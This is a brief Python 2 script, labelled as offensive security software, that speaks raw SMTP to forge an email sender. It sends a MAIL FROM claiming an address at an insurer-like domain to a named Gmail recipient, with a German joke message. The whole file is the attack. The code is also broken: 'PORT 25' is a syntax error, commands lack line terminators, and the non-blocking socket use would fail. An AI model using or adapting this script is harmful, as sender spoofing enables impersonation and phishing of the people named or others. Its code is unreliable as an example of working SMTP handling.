# Offensive Security Software
# SSE Program
# Attack: Spoofing Email Sender
# Date: February 1, 2016
# Description: Connects to an SMTP server and speaks plain SMTP to it.
# We set the socket to non-blocking mode to avoid that a call to recv() blocks
# forever when it doesn't recieve any data.

import socket

HOST = "localhost"
PORT 25
MAIL_TO = "brent.chambers@gmail.com"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.setblocking(0)
sock.connect((HOST, PORT))

sock.send('HELO du.du')
sock.send('MAIL FROM: stacy.nigh@azblue.com')
print repr(sock.recv(1024))

sock.send('RCPT TO: ' + MAIL_TO)
print repr(sock.recv(1024))

sock.send('DATA')
sock.send('Subject: Dein Wuschenzettle')
sock.send('Selbstverstaendlich bekomst Du Dein Pony!')
sock.send('Msg der weihchaint!')
sock.send('.')
print repr(sock.recv(1024))

sock.send('QUIT')
print repr(sock.recv(1024))

sock.close()
